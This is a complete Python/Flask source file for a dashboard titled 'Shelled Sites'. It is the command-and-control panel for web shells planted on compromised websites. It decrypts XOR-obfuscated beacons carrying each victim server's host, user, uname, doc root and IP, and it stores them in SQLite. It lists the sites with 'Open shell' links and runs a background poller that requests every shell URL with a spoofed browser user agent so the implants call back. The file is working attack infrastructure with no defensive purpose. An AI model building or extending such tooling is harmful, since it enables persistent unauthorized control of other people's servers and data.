#!/usr/bin/env python3
"""
dashboard.py — beacon dashboard with server-side active polling

NEW: background thread hits every registered shell_url every N seconds.
That triggers each beacon to ping back, refreshing its last_seen.
So the dashboard keeps sites "alive" without the beacon needing to loop.
"""

import os
import sys
import json
import time
import base64
import hashlib
import sqlite3
import argparse
import threading
from datetime import datetime
from flask import Flask, request, jsonify, Response, render_template_string

try:
    import requests
except ImportError:
    print("missing: pip install requests")
    sys.exit(1)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIG
# ============================================================

DEFAULT_HOST   = "0.0.0.0"
DEFAULT_PORT   = 8080
DEFAULT_SECRET = "change_this_secret"
DB_PATH        = "beacons.db"

ONLINE_WINDOW  = 120          # seconds — a site is "online" if seen within this
POLL_INTERVAL  = 20           # seconds between polls of each shell_url
POLL_TIMEOUT   = 10           # per-request timeout
PRUNE_AFTER    = 30 * 24 * 3600

# ============================================================
# CRYPTO
# ============================================================

def derive_key(secret, length):
    seed = hashlib.sha256(secret.encode()).digest()
    out = b""
    while len(out) < length:
        seed = hashlib.sha256(seed).digest()
        out += seed
    return out[:length]

def xor_apply(data, key):
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

def decrypt_payload(b64, secret):
    try:
        ct = base64.b64decode(b64, validate=True)
    except Exception:
        return None
    key = derive_key(secret, 32)
    return xor_apply(ct, key)

# ============================================================
# DB
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS sites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            fingerprint TEXT UNIQUE,
            host TEXT,
            site_url TEXT,
            shell_url TEXT,
            self_path TEXT,
            doc_root TEXT,
            server_ip TEXT,
            client_ip TEXT,
            user TEXT,
            os TEXT,
            php_version TEXT,
            server_sw TEXT,
            uname TEXT,
            info TEXT,
            first_seen INTEGER,
            last_seen INTEGER,
            hits INTEGER DEFAULT 1,
            poll_hits INTEGER DEFAULT 0,
            poll_fails INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()

def db_all():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM sites ORDER BY last_seen DESC").fetchall()
    conn.close()
    return [dict(r) for r in rows]

def db_get(sid):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    row = conn.execute("SELECT * FROM sites WHERE id=?", (sid,)).fetchone()
    conn.close()
    return dict(row) if row else None

def db_delete(sid):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM sites WHERE id=?", (sid,))
    conn.commit()
    conn.close()

# ============================================================
# FLASK
# ============================================================

app = Flask(__name__)
SECRET = DEFAULT_SECRET

def fingerprint(info):
    key = (info.get("host_header", "") + "|" +
           info.get("self_path", "") + "|" +
           info.get("self_dir", ""))
    return hashlib.sha256(key.encode()).hexdigest()[:24]

# ============================================================
# BEACON ENDPOINT
# ============================================================

@app.route("/api/beacon", methods=["POST"])
def api_beacon():
    raw = request.get_data()
    info = None

    # try encrypted first
    if raw:
        try:
            plain = decrypt_payload(raw, SECRET)
            if plain:
                data = json.loads(plain.decode())
                if data.get("secret") == SECRET:
                    info = data.get("info")
        except Exception:
            pass

    # try plain form-encoded
    if info is None:
        info_b64 = request.form.get("info", "")
        secret_got = request.form.get("secret", "")
        if info_b64 and secret_got == SECRET:
            try:
                info = json.loads(base64.b64decode(info_b64).decode())
            except Exception:
                pass

    if not info:
        return Response("bad request", status=400)

    fp = fingerprint(info)
    now = int(time.time())

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    existing = c.execute("SELECT id, hits FROM sites WHERE fingerprint=?", (fp,)).fetchone()

    site_url  = info.get("site_url") or info.get("url") or ("http://" + info.get("host_header", ""))
    shell_url = info.get("shell_url") or info.get("url") or ""

    if existing:
        c.execute("""
            UPDATE sites SET
                host=?, site_url=?, shell_url=?, self_path=?, doc_root=?,
                server_ip=?, client_ip=?, user=?, os=?, php_version=?,
                server_sw=?, uname=?, info=?, last_seen=?, hits=hits+1
            WHERE fingerprint=?
        """, (
            info.get("host"), site_url, shell_url,
            info.get("self_path"), info.get("doc_root"),
            info.get("server_ip"), info.get("client_ip"),
            info.get("user"), info.get("os"), info.get("php_version"),
            info.get("server_sw"), info.get("uname"), json.dumps(info),
            now, fp,
        ))
    else:
        c.execute("""
            INSERT INTO sites (
                fingerprint, host, site_url, shell_url, self_path, doc_root,
                server_ip, client_ip, user, os, php_version, server_sw, uname,
                info, first_seen, last_seen, hits
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
        """, (
            fp, info.get("host"), site_url, shell_url,
            info.get("self_path"), info.get("doc_root"),
            info.get("server_ip"), info.get("client_ip"),
            info.get("user"), info.get("os"), info.get("php_version"),
            info.get("server_sw"), info.get("uname"), json.dumps(info),
            now, now,
        ))
    conn.commit()
    conn.close()
    return Response(b"ok", status=200, mimetype="text/plain")

# ============================================================
# API
# ============================================================

@app.route("/api/sites", methods=["GET"])
def api_sites():
    now = int(time.time())
    out = []
    for s in db_all():
        s["online"] = (now - s["last_seen"]) < ONLINE_WINDOW
        s["first_seen_str"] = datetime.fromtimestamp(s["first_seen"]).strftime("%Y-%m-%d %H:%M:%S")
        s["last_seen_str"]  = datetime.fromtimestamp(s["last_seen"]).strftime("%Y-%m-%d %H:%M:%S")
        try:
            s["doc_root_sample"] = json.loads(s.get("info") or "{}").get("doc_root_sample", [])
        except Exception:
            s["doc_root_sample"] = []
        out.append(s)
    return jsonify(out)

@app.route("/api/sites/<int:sid>", methods=["GET"])
def api_site(sid):
    s = db_get(sid)
    if not s:
        return jsonify({"error": "not found"}), 404
    try:
        s["info_parsed"] = json.loads(s.get("info") or "{}")
    except Exception:
        s["info_parsed"] = {}
    return jsonify(s)

@app.route("/api/sites/<int:sid>", methods=["DELETE"])
def api_site_delete(sid):
    db_delete(sid)
    return jsonify({"ok": True})

@app.route("/api/stats", methods=["GET"])
def api_stats():
    sites = db_all()
    now = int(time.time())
    total = len(sites)
    online = sum(1 for s in sites if (now - s["last_seen"]) < ONLINE_WINDOW)
    return jsonify({"total": total, "online": online, "offline": total - online})

@app.route("/api/ping", methods=["GET"])
def api_ping():
    return jsonify({"ok": True, "t": int(time.time())})

@app.route("/api/poll_now", methods=["POST"])
def api_poll_now():
    """Trigger an immediate poll of all sites (for manual refresh)."""
    threading.Thread(target=poll_all_sites, daemon=True).start()
    return jsonify({"ok": True})

# ============================================================
# ACTIVE POLLING — server reaches back to each shell_url
# ============================================================

def poll_one_site(s):
    """HTTP GET the shell_url. Triggers the beacon to ping back."""
    url = s.get("shell_url") or s.get("site_url")
    if not url:
        return False, "no url"

    # some shells have headers that block empty UA — send a browser-ish one
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cache-Control": "no-cache",
        "X-Poller": "beacon-dashboard",
    }

    try:
        r = requests.get(
            url,
            headers=headers,
            timeout=POLL_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        # we don't care about the response — the beacon running on that
        # page is what matters. it fires its own POST back to /api/beacon.
        return True, f"http {r.status_code}"
    except Exception as e:
        return False, str(e)[:120]

def poll_all_sites():
    """One pass: hit every registered shell_url."""
    sites = db_all()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    for s in sites:
        ok, note = poll_one_site(s)
        if ok:
            c.execute(
                "UPDATE sites SET poll_hits=poll_hits+1 WHERE id=?",
                (s["id"],)
            )
        else:
            c.execute(
                "UPDATE sites SET poll_fails=poll_fails+1 WHERE id=?",
                (s["id"],)
            )
    conn.commit()
    conn.close()

def poller_loop():
    """Background thread — polls all sites every POLL_INTERVAL seconds."""
    while True:
        try:
            poll_all_sites()
        except Exception as e:
            print(f"[poller] error: {e}", file=sys.stderr)
        time.sleep(POLL_INTERVAL)

def prune_loop():
    while True:
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM sites WHERE last_seen < ?",
                         (int(time.time()) - PRUNE_AFTER,))
            conn.commit()
            conn.close()
        except Exception:
            pass
        time.sleep(3600)

# ============================================================
# HTML DASHBOARD
# ============================================================

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Shelled Sites — Dashboard</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  :root {
    --bg:#0a0e14; --bg-soft:#11151d; --bg-card:#161b25;
    --border:#1f2635; --text:#c8d1e0; --muted:#6b7589;
    --accent:#00e0a4; --red:#ff4d6d; --amber:#ffb547;
  }
  body {
    background:var(--bg); color:var(--text);
    font-family:-apple-system,"Segoe UI",system-ui,sans-serif;
    font-size:14px; line-height:1.5; min-height:100vh;
  }
  .container { max-width:1400px; margin:0 auto; padding:24px; }
  header {
    display:flex; justify-content:space-between; align-items:center;
    padding-bottom:20px; margin-bottom:24px;
    border-bottom:1px solid var(--border); flex-wrap:wrap; gap:12px;
  }
  h1 {
    color:#fff; font-size:20px; font-weight:600;
    display:flex; align-items:center; gap:10px;
  }
  h1::before {
    content:""; width:10px; height:10px; border-radius:50%;
    background:var(--accent); box-shadow:0 0 12px var(--accent);
    animation:pulse 2s infinite;
  }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
  .stats { display:flex; gap:22px; font-size:12px; color:var(--muted); text-transform:uppercase; letter-spacing:1px; }
  .stats b { color:var(--accent); font-size:14px; }
  .filters {
    display:flex; gap:10px; margin-bottom:20px;
    padding:14px; background:var(--bg-card);
    border:1px solid var(--border); border-radius:8px;
    flex-wrap:wrap; align-items:center;
  }
  .filters input[type=text] {
    background:var(--bg-soft); border:1px solid var(--border);
    color:var(--text); padding:8px 12px; border-radius:6px;
    font-family:inherit; font-size:13px; flex:1; min-width:200px; outline:none;
  }
  .filters input:focus { border-color:var(--accent); }
  .filters button {
    background:var(--bg-soft); color:var(--text); border:1px solid var(--border);
    padding:8px 14px; border-radius:6px; cursor:pointer; font-family:inherit;
    font-size:12px; transition:all .12s;
  }
  .filters button:hover { border-color:var(--accent); color:var(--accent); }
  .filters button.active { background:var(--accent); color:#0a0e14; border-color:var(--accent); }
  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(380px,1fr)); gap:16px; }
  .card {
    background:var(--bg-card); border:1px solid var(--border);
    border-radius:10px; padding:18px; transition:all .15s;
  }
  .card:hover { border-color:var(--accent); transform:translateY(-2px); }
  .card.offline { opacity:.55; }
  .card-head { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:12px; gap:10px; }
  .card-title { color:#fff; font-weight:600; display:flex; align-items:center; gap:8px; word-break:break-all; font-size:14px; }
  .dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; background:var(--muted); }
  .dot.online { background:var(--accent); box-shadow:0 0 8px var(--accent); }
  .dot.offline { background:var(--red); }
  .badge { background:var(--bg-soft); color:var(--muted); font-size:10px; padding:2px 8px; border-radius:10px; letter-spacing:1px; text-transform:uppercase; }
  .card-meta { font-size:12px; color:var(--muted); margin-bottom:14px; }
  .card-meta .row { display:grid; grid-template-columns:70px 1fr; gap:10px; padding:3px 0; }
  .card-meta .row span:first-child { color:var(--muted); text-transform:uppercase; font-size:10px; letter-spacing:1px; padding-top:2px; }
  .card-meta .row span:last-child { color:var(--text); font-family:ui-monospace,monospace; font-size:12px; word-break:break-all; }
  .card-meta .row span:last-child a { color:var(--accent); text-decoration:none; }
  .card-meta .row span:last-child a:hover { text-decoration:underline; }
  .card-actions { display:flex; gap:8px; flex-wrap:wrap; padding-top:12px; border-top:1px solid var(--border); }
  .card-actions button, .card-actions a {
    background:var(--bg-soft); color:var(--text); border:1px solid var(--border);
    padding:6px 12px; border-radius:5px; font-family:inherit;
    font-size:11px; cursor:pointer; text-decoration:none;
    transition:all .12s; font-weight:500;
  }
  .card-actions button:hover, .card-actions a:hover { border-color:var(--accent); color:var(--accent); }
  .card-actions button.danger:hover { border-color:var(--red); color:var(--red); }
  .empty { padding:60px; text-align:center; color:var(--muted); font-style:italic; }
  .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,.75); display:none; align-items:center; justify-content:center; z-index:1000; backdrop-filter:blur(4px); }
  .modal-bg.active { display:flex; }
  .modal { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; width:90%; max-width:900px; max-height:85vh; display:flex; flex-direction:column; overflow:hidden; }
  .modal-head { padding:16px 20px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
  .modal-head h3 { color:#fff; font-size:14px; font-weight:600; }
  .close-x { background:none; border:none; color:var(--muted); font-size:22px; cursor:pointer; padding:0 8px; }
  .close-x:hover { color:var(--red); }
  .modal-body { padding:20px; overflow:auto; flex:1; }
  .modal-foot { padding:12px 20px; border-top:1px solid var(--border); display:flex; justify-content:flex-end; gap:8px; }
  .kv { display:grid; grid-template-columns:180px 1fr; gap:6px 16px; font-size:13px; }
  .kv .k { color:var(--muted); text-transform:uppercase; font-size:10px; letter-spacing:1px; padding-top:3px; }
  .kv .v { color:var(--text); font-family:ui-monospace,monospace; word-break:break-all; }
  .code { background:var(--bg-soft); border:1px solid var(--border); border-radius:6px; padding:12px; margin-top:12px; font-family:ui-monospace,monospace; font-size:12px; white-space:pre-wrap; word-break:break-word; max-height:300px; overflow:auto; color:var(--text); }
  .toast { position:fixed; bottom:20px; right:20px; background:var(--bg-card); border:1px solid var(--accent); padding:12px 18px; border-radius:8px; font-size:13px; opacity:0; transform:translateY(10px); transition:all .2s; pointer-events:none; z-index:2000; max-width:400px; }
  .toast.show { opacity:1; transform:translateY(0); }
  .toast.err { border-color:var(--red); }
</style>
</head>
<body>

<div class="container">
  <header>
    <h1>Shelled Sites</h1>
    <div class="stats">
      <span>total <b id="s-total">0</b></span>
      <span>online <b id="s-online">0</b></span>
      <span>offline <b id="s-offline">0</b></span>
    </div>
  </header>

  <div class="filters">
    <input type="text" id="search" placeholder="filter by host, url, ip, user..." oninput="render()">
    <button id="f-all" class="active" onclick="setFilter('all')">All</button>
    <button id="f-online" onclick="setFilter('online')">Online</button>
    <button id="f-offline" onclick="setFilter('offline')">Offline</button>
    <button onclick="refresh()">Refresh</button>
    <button onclick="pollNow()">Poll now</button>
  </div>

  <div id="grid" class="grid">
    <div class="empty">waiting for beacons...</div>
  </div>
</div>

<div class="modal-bg" id="detail-modal">
  <div class="modal">
    <div class="modal-head">
      <h3 id="d-title">Site Detail</h3>
      <button class="close-x" onclick="closeDetail()">&times;</button>
    </div>
    <div class="modal-body" id="d-body">loading...</div>
    <div class="modal-foot">
      <button onclick="closeDetail()">Close</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
let sites = [];
let filter = 'all';

function toast(msg, err) {
  const e = document.getElementById('toast');
  e.textContent = msg;
  e.className = 'toast show' + (err ? ' err' : '');
  setTimeout(() => e.className = 'toast', 3000);
}
function esc(s) { const d = document.createElement('div'); d.textContent = s == null ? '' : String(s); return d.innerHTML; }
async function api(path, opts) {
  const r = await fetch(path, opts);
  if (!r.ok) throw new Error(await r.text() || r.statusText);
  return r.json();
}
async function refresh() {
  try {
    sites = await api('/api/sites');
    render();
    updateStats();
  } catch (e) { toast('load failed: ' + e.message, true); }
}
async function pollNow() {
  try {
    await api('/api/poll_now', { method: 'POST' });
    toast('polling all sites...');
    setTimeout(refresh, 4000);
  } catch (e) { toast('poll failed: ' + e.message, true); }
}
function updateStats() {
  const online = sites.filter(s => s.online).length;
  document.getElementById('s-total').textContent = sites.length;
  document.getElementById('s-online').textContent = online;
  document.getElementById('s-offline').textContent = sites.length - online;
}
function setFilter(f) {
  filter = f;
  document.querySelectorAll('.filters button').forEach(b => b.classList.remove('active'));
  document.getElementById('f-' + f).classList.add('active');
  render();
}
function matches(s) {
  if (filter === 'online' && !s.online) return false;
  if (filter === 'offline' && s.online) return false;
  const q = document.getElementById('search').value.toLowerCase().trim();
  if (!q) return true;
  const hay = [s.host, s.site_url, s.shell_url, s.server_ip, s.client_ip, s.user, s.php_version, s.os].join(' ').toLowerCase();
  return hay.includes(q);
}
function render() {
  const box = document.getElementById('grid');
  const visible = sites.filter(matches);
  if (!visible.length) {
    box.innerHTML = '<div class="empty">' + (sites.length ? 'no sites match filter' : 'waiting for beacons...') + '</div>';
    return;
  }
  let h = '';
  for (const s of visible) {
    const cls = s.online ? '' : 'offline';
    const dot = s.online ? 'online' : 'offline';
    h += `
      <div class="card ${cls}">
        <div class="card-head">
          <div class="card-title"><span class="dot ${dot}"></span>${esc(s.host || 'unknown')}</div>
          <span class="badge">${esc(s.user || '?')}</span>
        </div>
        <div class="card-meta">
          <div class="row"><span>site</span><span><a href="${esc(s.site_url)}" target="_blank" rel="noopener">${esc(s.site_url)}</a></span></div>
          <div class="row"><span>shell</span><span><a href="${esc(s.shell_url)}" target="_blank" rel="noopener">${esc(s.shell_url)}</a></span></div>
          <div class="row"><span>ip</span><span>${esc(s.server_ip || '-')}</span></div>
          <div class="row"><span>php</span><span>${esc(s.php_version || '-')}</span></div>
          <div class="row"><span>seen</span><span>${esc(s.last_seen_str || '-')}</span></div>
          <div class="row"><span>hits</span><span>${esc(s.hits)} (poll ${esc(s.poll_hits||0)}/${esc(s.poll_fails||0)})</span></div>
        </div>
        <div class="card-actions">
          <button onclick="openDetail(${s.id})">Detail</button>
          <a href="${esc(s.shell_url)}" target="_blank" rel="noopener">Open shell</a>
          <button class="danger" onclick="delSite(${s.id})">Remove</button>
        </div>
      </div>
    `;
  }
  box.innerHTML = h;
}
async function openDetail(id) {
  try {
    const d = await api('/api/sites/' + id);
    document.getElementById('d-title').textContent = d.host || 'Site';
    let h = '<div class="kv">';
    const fields = [
      ['host', d.host], ['site url', d.site_url], ['shell url', d.shell_url],
      ['self path', d.self_path], ['doc root', d.doc_root],
      ['server ip', d.server_ip], ['client ip', d.client_ip],
      ['user', d.user], ['os', d.os], ['uname', d.uname],
      ['php', d.php_version], ['server', d.server_sw],
      ['first seen', d.first_seen_str], ['last seen', d.last_seen_str],
      ['hits', d.hits], ['poll hits', d.poll_hits], ['poll fails', d.poll_fails],
    ];
    for (const [k, v] of fields) h += `<div class="k">${esc(k)}</div><div class="v">${esc(v || '-')}</div>`;
    h += '</div>';
    if (d.info_parsed && d.info_parsed.doc_root_sample && d.info_parsed.doc_root_sample.length) {
      h += '<div class="code"><strong style="color:var(--accent)">doc root sample</strong>\n' + d.info_parsed.doc_root_sample.map(esc).join('\n') + '</div>';
    }
    h += '<div class="code"><strong style="color:var(--accent)">raw info</strong>\n' + esc(JSON.stringify(d.info_parsed, null, 2)) + '</div>';
    document.getElementById('d-body').innerHTML = h;
    document.getElementById('detail-modal').classList.add('active');
  } catch (e) { toast('load failed: ' + e.message, true); }
}
function closeDetail() { document.getElementById('detail-modal').classList.remove('active'); }
async function delSite(id) {
  if (!confirm('remove this site?')) return;
  try { await api('/api/sites/' + id, { method: 'DELETE' }); toast('removed'); refresh(); }
  catch (e) { toast('delete failed: ' + e.message, true); }
}

refresh();
setInterval(refresh, 10000);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

# ============================================================
# MAIN
# ============================================================

def main():
    global SECRET, POLL_INTERVAL

    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--secret", default=DEFAULT_SECRET)
    ap.add_argument("--poll-interval", type=int, default=POLL_INTERVAL,
                    help="seconds between server-side polls of each site")
    args = ap.parse_args()

    SECRET = args.secret
    POLL_INTERVAL = args.poll_interval
    init_db()

    # background threads
    threading.Thread(target=poller_loop, daemon=True).start()
    threading.Thread(target=prune_loop, daemon=True).start()

    print(f"[*] dashboard on http://{args.host}:{args.port}")
    print(f"[*] secret: {SECRET}")
    print(f"[*] poll interval: {POLL_INTERVAL}s")
    print(f"[*] db: {DB_PATH}")

    app.run(host=args.host, port=args.port, debug=False, threaded=True)

if __name__ == "__main__":
    main()
